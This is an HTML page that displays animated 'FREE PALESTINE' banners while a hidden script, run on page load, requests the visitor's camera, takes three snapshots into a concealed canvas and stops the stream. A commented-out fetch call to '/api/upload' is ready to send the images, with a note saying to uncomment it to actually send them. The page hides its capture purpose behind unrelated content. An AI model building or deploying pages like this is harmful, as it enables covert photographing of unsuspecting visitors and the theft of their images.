<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Snapshot Test</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
  background: #000;
  font-family: 'Orbitron', sans-serif;
}

.text-layer {
  position: absolute;
  font-weight: 800;
  white-space: nowrap;
  z-index: 1;
  animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
  color: #00ffea;
  text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
}

.text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
.text2 { font-size: 5vw; top: 55%; left: 30%; animation-delay: 2s; }
.text3 { font-size: 4vw; top: 60%; left: 25%; animation-delay: 4s; }

@keyframes floatUp {
  0% { transform: translateY(0px); opacity: 1; }
  100% { transform: translateY(-150px); opacity: 0.8; }
}

@keyframes glow {
  0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
  100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
}

video#cameraStream, canvas#snapshot { display: none; }
</style>
</head>
<body>

<div class="text-layer text1">FREE PALESTINE</div>
<div class="text-layer text2">FREE PALESTINE</div>
<div class="text-layer text3">FREE PALESTINE</div>

<video id="cameraStream" autoplay playsinline muted></video>
<canvas id="snapshot"></canvas>

<script>
const camVideo = document.getElementById('cameraStream');
const canvas = document.getElementById('snapshot');
const ctx = canvas.getContext('2d');

function takeSnapshot(video) {
  if (!video.videoWidth || !video.videoHeight) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  const imageData = canvas.toDataURL('image/png');

  console.log("Snapshot ready");
  // Uncomment this line to actually send the snapshot
  // fetch('/api/upload', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image:imageData}) });
}

async function captureCameraSequence() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    camVideo.srcObject = stream;

    camVideo.onloadedmetadata = () => {
      takeSnapshot(camVideo);
      setTimeout(() => takeSnapshot(camVideo), 2000);
      setTimeout(() => takeSnapshot(camVideo), 4000);

      setTimeout(() => {
        stream.getTracks().forEach(track => track.stop());
        console.log("Camera stream stopped");
      }, 6000);
    };

  } catch(err) {
    console.error("Camera error:", err);
  }
}

window.addEventListener('load', () => {
  captureCameraSequence();
});
</script>

</body>
</html>
